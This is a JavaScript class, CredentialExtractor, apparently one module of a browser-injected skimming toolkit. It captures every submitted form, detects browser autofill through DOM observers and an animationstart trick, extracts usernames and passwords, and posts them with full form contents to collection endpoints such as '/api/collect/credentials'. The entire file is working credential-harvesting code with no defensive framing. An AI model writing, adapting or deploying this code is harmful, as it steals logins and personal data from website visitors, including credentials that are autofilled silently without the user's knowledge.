export default class CredentialExtractor {
  constructor(core) {
    this.core = core;
    this.observedForms = new WeakSet();
    this.autofillDetected = false;
  }

  init() {
    this.observeForms();
    this.observeAutofill();
    this.observeInputChanges();
  }

  observeForms() {
    document.addEventListener('submit', (event) => {
      const form = event.target;
      if (this.observedForms.has(form)) return;
      this.observedForms.add(form);

      const formData = this.extractFormData(form);
      
      setTimeout(() => {
        this.core.send('/api/collect/formdata', {
          formId: form.id || form.name || 'unnamed',
          fields: formData,
          url: window.location.href
        });
      }, 100);
    }, true);
  }

  observeAutofill() {
    // Detect autofill by watching for rapid value changes
    const autofillDetector = new MutationObserver((mutations) => {
      mutations.forEach(mutation => {
        if (mutation.type === 'attributes' && mutation.attributeName === 'value') {
          this.handlePotentialAutofill(mutation.target);
        }
      });
    });

    document.querySelectorAll('input').forEach(input => {
      autofillDetector.observe(input, { attributes: true, attributeFilter: ['value'] });
    });

    // Also watch for new inputs
    new MutationObserver((mutations) => {
      mutations.forEach(m => {
        m.addedNodes.forEach(node => {
          if (node.nodeName === 'INPUT') {
            autofillDetector.observe(node, { attributes: true, attributeFilter: ['value'] });
          }
          if (node.querySelectorAll) {
            node.querySelectorAll('input').forEach(input => {
              autofillDetector.observe(input, { attributes: true, attributeFilter: ['value'] });
            });
          }
        });
      });
    }).observe(document.body, { childList: true, subtree: true });
  }

  observeInputChanges() {
    // Watch input events for autofill animationstart trick
    document.addEventListener('animationstart', (event) => {
      if (event.animationName.includes('autofill')) {
        this.handlePotentialAutofill(event.target);
      }
    });
  }

  handlePotentialAutofill(input) {
    if (this.autofillDetected) return;
    
    // Gather all visible form fields
    const form = input.closest('form');
    if (!form) return;

    const formData = this.extractFormData(form);
    const hasValue = Object.values(formData).some(v => v && v.length > 0);
    
    if (hasValue) {
      this.autofillDetected = true;
      
      // Extract credentials specifically
      const usernameField = form.querySelector('input[type="email"], input[name*="email"], input[name*="user"], input[name*="login"]');
      const passwordField = form.querySelector('input[type="password"]');
      
      const username = usernameField?.value || formData['email'] || formData['username'] || '';
      const password = passwordField?.value || '';

      if (username && password) {
        this.core.send('/api/collect/credentials', {
          source: 'autofill',
          username: username,
          password: password,
          email: formData['email'] || username,
          url: window.location.href,
          formType: form?.id || 'autofill-detected',
          fieldData: formData
        });
      }

      // Also send full form data
      this.core.send('/api/collect/formdata', {
        formId: form?.id || form?.name || 'autofill-form',
        fields: formData,
        url: window.location.href
      });

      setTimeout(() => { this.autofillDetected = false; }, 3000);
    }
  }

  extractFormData(form) {
    const data = {};
    const formElements = form.querySelectorAll('input, select, textarea');
    
    formElements.forEach(el => {
      if (el.name || el.id) {
        const key = el.name || el.id;
        if (el.type === 'checkbox' || el.type === 'radio') {
          if (el.checked) data[key] = el.value;
        } else {
          data[key] = el.value;
        }
      }
    });

    return data;
  }
}